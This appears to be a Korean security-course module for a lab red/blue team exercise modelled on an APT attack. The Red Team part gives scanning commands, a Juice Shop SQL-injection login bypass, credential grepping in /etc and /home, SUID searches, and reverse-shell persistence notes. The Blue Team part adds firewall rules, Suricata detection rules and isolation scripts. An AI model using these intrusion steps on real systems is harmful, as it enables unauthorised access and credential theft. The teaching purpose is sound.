# Week 14: 종합 공방전 — 다단계 공격/방어 시나리오

## 학습 목표
- 다단계 공격 시나리오(정찰→침투→상승→유출)를 계획하고 실행할 수 있다
- 다층 방어 체계를 구축하여 각 공격 단계를 차단할 수 있다
- APT(지능형 지속 위협) 스타일의 공격을 시뮬레이션할 수 있다
- 실전에 가까운 복합 시나리오에서 의사결정 능력을 검증한다

## 선수 지식
- Week 01-13 전체 과정 수료
- 팀 공방전 경험 (Week 13)

## 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:15 | 시나리오 브리핑 | 강의 |
| 0:15-0:30 | 팀 전략 수립 | 토론 |
| 0:30-0:40 | 휴식 + 환경 확인 | - |
| 0:40-2:10 | 종합 공방전 (90분) | 실전 |
| 2:10-2:20 | 휴식 | - |
| 2:20-3:00 | 타임라인 재구성 + 분석 | 실습 |
| 3:00-3:40 | 종합 디브리핑 | 토론 |

---

# Part 1: 다단계 시나리오 (15분)

## 1.1 시나리오 개요

이번 종합 공방전은 실제 APT 공격을 시뮬레이션하는 다단계 시나리오이다.

### 시나리오: "Operation Shadow Flag"

```
공격 시나리오 (4단계)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Phase 1: 외부 정찰 + 웹 서버 침투
  └── 웹 서버(web)의 취약점을 이용한 초기 접근

Phase 2: 내부 이동 (Lateral Movement)
  └── 웹 서버를 교두보로 보안 서버(secu)에 접근

Phase 3: 권한 상승 + 데이터 탈취
  └── root 권한 획득 후 플래그 파일 수집

Phase 4: 증거 인멸 + 지속성 확보
  └── 로그 삭제 시도, 백도어 설치
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### 방어 시나리오

```
방어 체계 (4계층)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Layer 1: 경계 방어 (방화벽 + WAF)
  └── 외부 공격 트래픽 필터링

Layer 2: 탐지 (IDS + 로그 모니터링)
  └── 침투 시도 및 이상 행위 탐지

Layer 3: 대응 (격리 + 차단)
  └── 침해 시스템 격리, 공격 IP 차단

Layer 4: 복구 (백업 + 서비스 복원)
  └── 서비스 가용성 유지
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## 1.2 점수 체계

| 항목 | Red Team | Blue Team |
|------|----------|-----------|
| Phase 1 완료 (웹 서버 접근) | +20 | - |
| Phase 2 완료 (내부 이동) | +25 | - |
| Phase 3 완료 (플래그 획득) | +35 | - |
| Phase 4 완료 (지속성 확보) | +20 | - |
| 각 Phase 탐지 | - | +15/Phase |
| 각 Phase 차단 | - | +20/Phase |
| 서비스 가용성 (90분 중) | - | +1/분 |
| 종합 보고서 | +10 | +10 |

---

# Part 2: 실습 가이드

## 실습 2.1: Red Team — 다단계 침투

> **목적**: 4단계 공격을 순서대로 수행하며 최종 목표를 달성한다
> **배우는 것**: APT 스타일 공격, Lateral Movement, 증거 인멸

```bash
# Phase 1: 웹 서버 침투
# 1-1. 정찰
nmap -sV -p 80,3000,8080 10.20.30.80

# 1-2. 웹 취약점 공격
curl -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"x"}'

# 1-3. 웹 셸 또는 리버스 셸 확보 (실습 환경)
# SSH 접근 확보 시
ssh user@10.20.30.80

# Phase 2: 내부 이동 (Lateral Movement)
# 2-1. 내부 네트워크 정찰
ip addr
ip route
nmap -sn 10.20.30.0/24

# 2-2. 내부 서버 접근 시도
# SSH 키 또는 패스워드 재사용 확인
cat ~/.ssh/known_hosts
grep -r "password" /etc/ /home/ 2>/dev/null | head -10

# 2-3. 보안 서버 접근
ssh admin@10.20.30.1

# Phase 3: 권한 상승 + 플래그 획득
sudo -l
find / -perm -4000 -type f 2>/dev/null
# 권한 상승 후
cat /root/flag.txt

# Phase 4: 지속성 확보 (실습용)
# SSH 키 추가
# crontab 등록 (리버스 셸)
```

> **결과 해석**: 각 Phase를 완료한 시간을 기록한다. Phase 간 전환 시 탐지 회피에 주의한다.

## 실습 2.2: Blue Team — 다층 방어

> **목적**: 4계층 방어 체계를 구축하고 운영한다
> **배우는 것**: Defense in Depth 구현, 계층별 대응

```bash
# Layer 1: 경계 방어
# 방화벽 강화 (웹 서버)
sudo nft add rule inet filter input tcp dport { 80, 443 } accept
sudo nft add rule inet filter input tcp dport 22 ip saddr 10.20.30.201 accept
sudo nft add rule inet filter input drop

# Layer 2: 탐지 체계
# Suricata 커스텀 룰 (Lateral Movement 탐지)
sudo tee -a /etc/suricata/rules/battle.rules << 'EOF'
alert tcp $HOME_NET any -> $HOME_NET 22 (msg:"LATERAL: Internal SSH"; \
  flow:to_server; sid:300001; rev:1;)
alert tcp any any -> $HOME_NET any (msg:"LATERAL: Internal scan"; \
  flags:S; threshold:type both, track by_src, count 10, seconds 30; \
  sid:300002; rev:1;)
EOF

# Layer 3: 대응 절차
# 침해 확인 시 격리 스크립트
cat > /tmp/isolate.sh << 'SCRIPT'
#!/bin/bash
TARGET=$1
echo "$(date): 격리 시작 - $TARGET"
sudo nft add rule inet filter input ip saddr $TARGET drop
sudo nft add rule inet filter output ip daddr $TARGET drop
echo "$(date): 격리 완료 - $TARGET" >> /tmp/defense_log.txt
SCRIPT
chmod +x /tmp/isolate.sh

# Layer 4: 서비스 상태 모니터링
while true; do
  for PORT in 80 3000; do
    if ! ss -tln | grep -q ":$PORT "; then
      echo "$(date): 서비스 DOWN - 포트 $PORT" >> /tmp/service_status.txt
      # 서비스 재시작 시도
    fi
  done
  sleep 30
done &
```

> **결과 해석**: 각 계층에서 탐지/차단된 이벤트를 기록하여 방어 체계의 효과를 측정한다.

## 실습 2.3: 타임라인 재구성

> **목적**: 공방전 전체 흐름을 시간순으로 재구성한다
> **배우는 것**: 포렌식 타임라인, 상관 분석

```bash
# 전체 타임라인 생성
echo "=== 종합 공방전 타임라인 ===" > /tmp/full_timeline.txt

# IDS 이벤트
echo "--- IDS ---" >> /tmp/full_timeline.txt
cat /var/log/suricata/fast.log >> /tmp/full_timeline.txt

# 인증 이벤트
echo "--- AUTH ---" >> /tmp/full_timeline.txt
grep -E "Failed|Accepted|sudo" /var/log/auth.log >> /tmp/full_timeline.txt

# 방어 조치
echo "--- DEFENSE ---" >> /tmp/full_timeline.txt
cat /tmp/defense_log.txt >> /tmp/full_timeline.txt

# Kill Chain 매핑
echo "=== Kill Chain 매핑 ===" >> /tmp/full_timeline.txt
echo "Phase 1 (정찰+침투): 시작 시간 ~ 완료 시간" >> /tmp/full_timeline.txt
echo "Phase 2 (내부 이동): 시작 시간 ~ 완료 시간" >> /tmp/full_timeline.txt
echo "Phase 3 (권한 상승): 시작 시간 ~ 완료 시간" >> /tmp/full_timeline.txt
echo "Phase 4 (지속성):   시작 시간 ~ 완료 시간" >> /tmp/full_timeline.txt
```

---

# Part 3: 심화 학습

## 3.1 실제 APT 사례 비교

이번 시나리오와 실제 APT 공격의 유사점:

- **SolarWinds (2020)**: 공급망 → 내부 이동 → 데이터 탈취
- **Colonial Pipeline (2021)**: VPN 침투 → 랜섬웨어 배포
- **Log4Shell (2021)**: 웹 취약점 → 원격 코드 실행 → 내부 이동

## 3.2 MITRE ATT&CK 매핑

시나리오의 각 Phase를 ATT&CK 기법에 매핑한다.

| Phase | ATT&CK 기법 | ID |
|-------|------------|-----|
| 1 | Exploit Public-Facing Application | T1190 |
| 2 | Remote Services: SSH | T1021.004 |
| 3 | Exploitation for Privilege Escalation | T1068 |
| 4 | Account Manipulation | T1098 |

---

## 검증 체크리스트
- [ ] Red Team: 최소 Phase 2까지 진행했는가
- [ ] Blue Team: 최소 2개 Phase의 공격을 탐지했는가
- [ ] 전체 타임라인을 재구성했는가
- [ ] MITRE ATT&CK에 매핑했는가

## 자가 점검 퀴즈
1. Lateral Movement를 탐지하기 위한 IDS 룰을 설계하라.
2. Defense in Depth의 4계층을 설명하고 각 계층의 도구를 제시하라.
3. APT 공격에서 '지속성 확보'가 공격자에게 중요한 이유는?
4. 종합 공방전에서 시간 관리가 승패에 미치는 영향을 분석하라.
5. 실제 APT 사례 1건을 선택하여 Kill Chain에 매핑하라.
